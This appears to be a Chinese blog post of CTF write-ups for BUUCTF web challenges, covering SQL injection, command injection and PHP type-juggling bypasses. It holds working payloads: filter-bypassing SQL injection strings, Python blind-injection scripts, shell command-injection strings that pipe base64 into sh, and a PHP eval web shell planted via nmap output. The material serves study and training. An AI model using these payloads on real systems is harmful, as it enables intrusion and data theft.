<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>测出来也是单引号闭合，但用order by 3测试时发现报错时”der 3”，说明or和by被过滤，使用双拼即可绕过，这道题几乎所有关键字都可以用双拼绕过，先查库名：</p>
<pre><code>?username=-1&#39; uunionnion seselectlect 1,2,database()-- -&amp;password=admin
//geek
</code></pre>
<p>再查表明：</p>
<pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39; -- -&amp;password=admin
//b4bsql,geekuser
</code></pre>
<p>再查字段：</p>
<pre><code>username=-1&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39; -- -&amp;password=admin
//id,username,password
</code></pre>
<p>最终在b4bsql表里找到了flag</p>
<pre><code>?username=-1&#39; ununionion seselectlect 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) frfromom b4bsql -- -&amp;password=admin
</code></pre>
<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>搞了一圈发现连()都过滤了，看别人wp才发现源码有个注释：</p>
<pre><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5
base32解码：c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==
base64解码：select * from user where username = &#39;$name&#39;
</code></pre>
<pre><code>Base64和Base32 区别：
base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+/；
base32中只包含大写字母（A-Z）和数字234567
</code></pre>
<p>同时，这一关利用sqli的特性：<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p>
<p>所以，如果我们使用联合查询访问，一个真实存在的用户名和一个我们自己编造的密码，就会使虚拟数据混淆admin密码，从而使我们成功登录，得到 flag</p>
<p>我们这题可以测出有三个列，按照报错回显，可以确定第二个列是username,第三个列是password，那么第一列应该是id，我们尝试构造出：</p>
<pre><code>name=1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;pw=1
</code></pre>
<p>如果你看过这题的源代码就会发现，密码是要于数据库中被md5加密过的密码进行对比的，所以我们第三列的字符串是1的md5值。</p>
<h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>测试了一下union,空格都被过滤了，试试报错注入，空格用括号代替：</p>
<pre><code>?username=-1&#39;or(updatexml(1,concat(0x7e,database()),1))%23&amp;password=admin
username=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password=admin
//geek
</code></pre>
<p>测表名，等号也被过滤了，用like代替</p>
<pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like&#39;geek&#39;)),1)%23&amp;password=admin
//H4rDsq1
</code></pre>
<p>测字段</p>
<pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;)),1)%23&amp;password=admin
//id,username,password
</code></pre>
<p>爆数据</p>
<pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(concat_ws(0x7e,username,password)))from(H4rDsq1))),1)%23&amp;password=admin
//~flag~flag&#123;53f3bd9d-f44f-4ce5-a0
</code></pre>
<p>可以看到，只出来了左半部分，使用right()：</p>
<pre><code>?username=admin&#39;^updatexml(1,concat(0x7e,(select(right(group_concat(concat_ws(0x7e,username,password)),20))from(H4rDsq1))),1)%23&amp;password=admin
//~5-a0c8-2720a6d31213&#125;
</code></pre>
<h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>用order by 测出有两列数据，继续union select 1,2时发现爆出了过滤的字符：</p>
<img src="/2023/08/03/buuctf/155441.png" class="">

<p>用extractvalue也只能注出库名</p>
<p>试试堆叠注入，测库名：</p>
<pre><code>inject=1&#39;;show databases;
</code></pre>
<img src="/2023/08/03/buuctf/161321.png" class="">

<p>测表名：</p>
<pre><code>?inject=1&#39;;show tables;
</code></pre>
<img src="/2023/08/03/buuctf/161643.png" class="">

<p>测字段，如果tableName是纯数字，需要用&#96;包裹：</p>
<pre><code>?inject=1&#39;;show columns from `1919810931114514`;
</code></pre>
<img src="/2023/08/03/buuctf/170603.png" class="">

<p>然后就无能为力，看看大佬wp</p>
<p><strong>解法一：</strong></p>
<p>可以看到words表里有两个属性，即两列：id 和data<br>而1919810931114514表里只有一个属性列<br>说明输入框可能查询的就是words表<br>后台sql语句可能为</p>
<pre><code>select id,data from words where id=
</code></pre>
<p>接下来就是如何获取flag了，思路是把1919810931114514表改名为words表，把属性名flag改为id，然后用1’ or 1&#x3D;1;# 显示flag出来，在这之前当然要先把words表改名为其他</p>
<pre><code>1&#39;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);#
</code></pre>
<p><strong>解法二：</strong></p>
<p> 因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：</p>
<pre><code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE hacker;#
</code></pre>
<p>关于预编译，可以参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p>
<p><strong>解法三</strong>：</p>
<p>还是预编译，不过我们可以将sql语句直接进行16进制编码</p>
<pre><code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#
</code></pre>
<p>注：prepare…from…是预处理语句，会进行编码转换。</p>
<p>​	    SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p>
<p><strong>解法四：</strong></p>
<p>此题还可以通过handle直接出答案：</p>
<pre><code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;
</code></pre>
<pre><code class="text">打开表：
HANDLER 表名 OPEN ;
查看数据：
HANDLER 表名 READ next;
关闭表：
HANDLER 表名 READ CLOSE;
</code></pre>
<p>可以参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p>
<h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>屏蔽了alter和prepare。还可以使用上一道题的第三种方法。</p>
<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>这道题输入1和2会输出不同的话，输入其他数字会显示Error Occured When Fetch Result.</p>
<p>尝试报错注入发现只显示bool(false)，所以我们试试盲注，这道题过滤了空格，用括号可以代替：</p>
<pre><code>id=if(1=1,1,2)	//Hello, glzjin wants a girlfriend.
id=if(1=2,1,2)	//Do you want to be my girlfriend?
</code></pre>
<p>发现可以用布尔盲注，题目提示了flag在flag表里的flag字段里，直接爆数据：</p>
<pre><code>id=if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,2)
</code></pre>
<p>脚本：</p>
<pre><code>import requests
if __name__ == &#39;__main__&#39; :
    url = &#39;http://bb5603db-211d-4c37-9796-e7a42349e7c8.node4.buuoj.cn:81/index.php&#39;
    result = &#39;&#39;
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) // 2
            payload = f&#39;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&#39;
            data = &#123;
                &quot;id&quot;:payload
            &#125;
            r = requests.post(url=url,data=data)
            if &#39;Hello&#39; in r.text:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            result += chr(low)
        else:
            break
        print(result)
</code></pre>
<h3 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h3><p>这道题很坑，在登录框里瞎注了半天，没有头绪，最后看别人wp才知道注入点在那几个按妞的地方</p>
<p>分别点击那几个按钮你就会发现url里的id会变，这就是注入点，get型注入，而且这道题是数字型注入</p>
<p>测试了一下发现过滤了空格，#，and，order by，union啥的，所以我们试试用括号和异或来进行代替</p>
<pre><code>?id=0^(ascii(substr((select(database())),1,1))&gt;2)
</code></pre>
<img src="/2023/08/03/buuctf/172434.png" class="">

<p>可以看到返回结果与id&#x3D;1一样，可以成功绕过，基于此，我们可以用脚本进行注入：</p>
<pre><code class="python">import requests
import time
if __name__ == &#39;__main__&#39; :
    url = &#39;http://cf3b0295-5066-4352-aa2b-51ccb07a38c5.node4.buuoj.cn:81/search.php?id=0^&#39;
    result = &#39;&#39;
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 130
        while low &lt; high:
            mid = (low + high) // 2
            #爆库名
            #payload = f&#39;(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;
            #爆表名    
            #payload=f&#39;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;
            #爆字段
            #payload = f&#39;(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;geek&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;
            #爆数据
           #payload=f&#39;(ascii(substr((select(group_concat(concat_ws(&quot;~&quot;,username,password)))from(F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;  				       
            r = requests.get(url=url+payload)
            time.sleep(0.05)
            if &#39;others&#39; in r.text:
                low = mid + 1
            else:
                high = mid
        if low!=32:
            result += chr(low)
        else:
            break
        print(result) 
</code></pre>
<p>这里要注意的是time.sleep()，请求过快可能不能响应，需要加点延时。</p>
<h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>打开后是一个输入框，但输入什么都没反应，用burp抓包：</p>
<img src="/2023/08/03/buuctf/201609.png" class="">

<p>这里面password就是我们用户框中输入得东西。如果通过md5($pass,True)之后返回字符串是’or ‘1的话，形成一个永真条件:select * from ‘admin’ where password&#x3D;’ ‘or ‘6…’</p>
<p>问题是这里的md5加上参数True后返回的是原始16字符2进制格式</p>
<p>我们可以通过这个脚本来获得满足我们要求的明文：</p>
<pre><code>&lt;?php 
for ($i = 0;;) &#123; 
 for ($c = 0; $c &lt; 1000000; $c++, $i++)
  if (stripos(md5($i, true), &#39;\&#39;or\&#39;&#39;) !== false)
   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;;
 echo &quot;.&quot;;
&#125;
?&gt;
</code></pre>
<p>这里我们用网上常用的<strong>ffifdyop</strong>，这个字符串经过md5($pass,True)后就是<code>&#39;or &#39;6...</code></p>
<p>传上去后页面跳转到levels91.php，查看源代码：</p>
<img src="/2023/08/03/buuctf/205543.png" class="">

<p>弱类型比较，第一种方法是找出md5值都是两个0e开头的开头的。原理是php里面在做 &#x3D;&#x3D; 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。这样的字符网上有很多</p>
<pre><code>s878926199a
s155964671a
240610708
UYXFLOI
</code></pre>
<p>第二种方法是用数组绕过：</p>
<pre><code>?a[]=1&amp;b[]=2
</code></pre>
<p>传参后又跳转到levell14.php</p>
<img src="/2023/08/03/buuctf/210632.png" class="">

<p>这里是强类型比较，就只能用数组绕过（&#x3D;&#x3D;&#x3D;要求值和类型都相同，貌似当类型为string时，还要比较字符串是否一摸一样）</p>
<pre><code>param1[]=1&amp;param2[]=2
</code></pre>
<h1 id="命令执行-rce"><a href="#命令执行-rce" class="headerlink" title="命令执行(rce)"></a>命令执行(rce)</h1><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>先测目录，发现在根目录有flag文件</p>
<pre><code>target=127.0.0.1;ls ../../../
</code></pre>
<img src="/2023/08/03/buuctf/101305.png" class="">

<p>查看文件，爆出flag</p>
<pre><code>target=127.0.0.1;cat ../../../flag
</code></pre>
<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>进去有个提示&#x2F;?ip，get一下发现和前面一道题差不多</p>
<p>命令联合执行：</p>
<pre><code>;     前面的执行完执行后面的
|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         
||    当前面的执行出错时（为假）执行后面的
&amp;     将任务置于后台执行
&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真
%0a  （换行）
%0d  （回车）
</code></pre>
<p>通配符：</p>
<pre><code>*	#匹配全部字符，通配符
?	#任意一个字符，通配符
[]	#表示一个范围（正则，通配符）
&#123;&#125;	#产生一个序列（通配符）
</code></pre>
<p>ls就发现了flag.php和index.php，但测试了一下很多东西都被过滤了，空格只能用$IFS$1绕过，flag也被ban了，我们来尝试一下index.php:</p>
<img src="/2023/08/03/buuctf/103747.png" class="">

<pre><code>总结过滤的特殊字符
&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#39; &quot; \ () [] &#123;&#125;  空格
&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; 
</code></pre>
<p>1、变量替换</p>
<pre><code>?ip=127.0.0.1;b=g;cat$IFS$1fla$b.php
//这里的变量替换顺序要注意，不然又被贪婪匹配ban了
</code></pre>
<p>2、变量ab互换传递，绕过字符串匹配，实现拼接</p>
<pre><code>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php
</code></pre>
<p>3、内联执行</p>
<pre><code>?ip=127.0.0.1;cat$IFS`ls`
?ip=127.0.0.1;cat$IFS$3`ls`
</code></pre>
<p>4、被过滤的bash，用管道+sh替换</p>
<pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  //cat flag.php用base64加密来绕过正则匹配
?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash //bash被ban了
</code></pre>
<h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>这道题只有一个eval($_POST[“Syc”]);，可以直接用蚁剑连接</p>
<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>这道题目在一开始就是一个空白的单纯页面，但是你经过目录扫描的话就会发现一个.git文件</p>
<p>{ % asset_img 224106.png%}</p>
<p>这里是git源码泄露，可以用githack把他搞出来</p>
<p>得到一个index.php</p>
<img src="/2023/08/03/buuctf/224448.png" class="">

<p>可以看到，第一层正则过滤了伪协议，第二层正则是一直递归，也就是所谓的无参数函数校验，例如它可以匹配到a(b(c()d()))，紧接着 又是一次黑名单过滤，很多的关键字都被ban掉了</p>
<p>所以这题不能用伪协议，只能用无参数函数形式，且过滤了很多函数</p>
<p>我们第一步肯定是想知道当前目录之下都有些什么<br>所以要构建如下语句</p>
<pre><code>&lt;?php
print_r(scandir(&#39;.&#39;));
?&gt;
</code></pre>
<p>但是，它只能允许无参数函数，所以我们就要想办法利用无参数函数将“.”给构造出来。</p>
<p>payload</p>
<pre><code>print_r(scandir(current(localeconv())));
或highlight_file(next(scandir(pos(localeconv()))));
</code></pre>
<pre><code>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。
pos()或current()函数 输出数组中的当前元素的值。
</code></pre>
<p>可以看到，flag在当前目录下，读flag文件：</p>
<pre><code>print_r(show_source(array_rand(array_flip(scandir(current(localeconv()))))));
//array_flip()又可以将数组中的键和值进行对换
//array_rand()函数可以随机读取一个数组键
或
highlight_file(next(array_reverse(scandir(pos(localeconv())))));
//array_reverse() 函数以相反的元素顺序返回数组
//next() 输出数组中的当前元素的下一个元素的值
</code></pre>
<h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><p>打开后显示一个hackme和Cannot modify header information - headers already sent by ……</p>
<p>抓包也没找到有用的信息，但是可以用dirsearch扫出robots,txt:</p>
<img src="/2023/08/03/buuctf/192357.png" class="">

<p>进入到fAke_f1agggg.php也没找到啥有用的，抓包：</p>
<img src="/2023/08/03/buuctf/192548.png" class="">

<p>发现一个fl4g.php，进入</p>
<img src="/2023/08/03/buuctf/192742.png" class="">

<p>可以改一下编码</p>
<p>有三层绕过</p>
<p>1、intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</p>
<p>这里可以用字符串的整型转换，虽然intval函数可以自动判别0x、0b等等的前缀，但不要忘了我们这里传进去的其实字符串，所以会产生从字符串到数字的转换</p>
<pre><code>payload ?num=0xABC或num=700e5
</code></pre>
<p>2、$md5&#x3D;$_GET[‘md5’]</p>
<p>md5弱类型比较</p>
<pre><code>payload: md5=0e215962017
</code></pre>
<p>3、屏蔽了空格和cat</p>
<pre><code>payload: get_flag=tac%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
</code></pre>
<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>进去之后，发现url里有个img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0，看起来像base64，先解码一下</p>
<p>MzUzNTM1MmU3MDZlNjc&#x3D;</p>
<p>再解码一次</p>
<p>3535352e706e67</p>
<p>再16进制转字符串</p>
<p>555.png（这个应该是首页中图片的名称，可能存在文件包含）</p>
<p>查看源代码，发现有一堆base64编码的字符，试一下base64转图片：</p>
<img src="/2023/08/03/buuctf/225252.png" class="">

<p>就是首页的图片</p>
<p>试试包含一下index.php</p>
<p>对index.php先转16进制再进行两次base64编码：</p>
<p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p>
<p>查看源代码然后base64解码：</p>
<pre><code>&lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header(&#39;content-type:text/html;charset=utf-8&#39;);
$cmd = $_GET[&#39;cmd&#39;];
if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));

$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);
if (preg_match(&quot;/flag/i&quot;, $file)) &#123;
    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;
    die(&quot;xixi～ no flag&quot;);
&#125; else &#123;
    $txt = base64_encode(file_get_contents($file));
    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;
    echo &quot;&lt;br&gt;&quot;;
&#125;
echo $cmd;
echo &quot;&lt;br&gt;&quot;;
if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;
    echo(&quot;forbid ~&quot;);
    echo &quot;&lt;br&gt;&quot;;
&#125; else &#123;
    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;
        echo `$cmd`;
    &#125; else &#123;
        echo (&quot;md5 is funny ~&quot;);
    &#125;
&#125;

?&gt;
&lt;html&gt;
&lt;style&gt;
  body&#123;
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
&#125;
&lt;/style&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>审计代码，发现这里用来强制转化（（String）强制转换，数组被强制转换的结果都为<code>string(5) &quot;Array&quot;</code>），所以要用到强类型绕过</p>
<p>payload:</p>
<pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</code></pre>
<p>进行url解码后的MD5值相等</p>
<p>收录一些md5值相等的字符串：</p>
<pre><code>$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;
$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;

$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;
$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;
</code></pre>
<p>然后用dir读取目录</p>
<p>最后用c\at%20flag读取flag（题目虽然用了正则**<code>|\\|\\\\</code>**，但这里这样写造成了反斜杠逃逸）</p>
<p>这里补充一个md5的知识点</p>
<h5 id="a-x3D-x3D-md5-a）"><a href="#a-x3D-x3D-md5-a）" class="headerlink" title="$a&#x3D;&#x3D;md5($a）"></a>$a&#x3D;&#x3D;md5($a）</h5><p><code>0e215962017</code> 的 MD5 值是由 <strong>0e</strong> 开头，在 PHP 弱类型比较中相等</p>
<h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p>这道题之前做过类似的，考察的是nmap的使用</p>
<p>先测试127.0.0.1 | ls，发现<code>|</code>被转义了，继续测试了一下发现&amp;、;也都被转义了，所以估计代码里使用了和上次那道题一样的函数<code>escapeshellarg()</code>与<code>escapeshellcmd()</code></p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/110900266">https://blog.csdn.net/weixin_44037296/article/details/110900266</a></p>
<p>直接上payload:</p>
<pre><code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;
</code></pre>
<p>但是这样会被检测出来，测试了一下发现是过滤了php</p>
<pre><code>&#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;
</code></pre>
<p>报错Host maybe down</p>
<p>加上扫描的地址</p>
<pre><code>127.0.0.1 | &#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;
</code></pre>
<p>然后rce即可</p>
<h3 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h3><p>这道题先爆破了一下好像不行，然后用dirsearch扫描出一个index.php.swp</p>
<pre><code>&lt;?php
    ob_start();
    function get_hash()&#123;
        $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;
        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
        $content = uniqid().$random;
        return sha1($content); 
    &#125;
    header(&quot;Content-Type: text/html;charset=utf-8&quot;);
    ***
    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )
    &#123;
        $admin = &#39;6d0bc1&#39;;
        if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;
            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;
            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;
            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
            $text = &#39;
            ***
            ***
            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;
            ***
            ***&#39;;
            fwrite($shtml,$text);
            fclose($shtml);
            ***
            echo &quot;[!] Header  error ...&quot;;
        &#125; else &#123;
            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;  
    &#125;else
    &#123;
    ***
    &#125;
    ***
?&gt;
</code></pre>
<p>看起来这么长，其实只需要先传一个pasword，然后让substr(md5($_POST[‘password’]),0,6)&#x3D;&#x3D;‘6d0bc1’就行了</p>
<pre><code>import hashlib
for i in range(100000000):
    a = hashlib.md5(str(i).encode(&quot;utf-8&quot;)).hexdigest()
    if a[0:6] == &#39;6d0bc1&#39;:
        print(i)
#2305004
</code></pre>
<p>然后输进去，我们可以获取到一个消息头：</p>
<img src="/2023/08/03/buuctf/234936.png" class="">

<p>进这个文件：</p>
<img src="/2023/08/03/buuctf/235439.png" class="">

<p>如何执行命令呢？这里就用到了Apache SSI 远程命令执行漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p>
<p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用&lt;!–#exec cmd&#x3D;”id” –&gt;语法执行命令。</p>
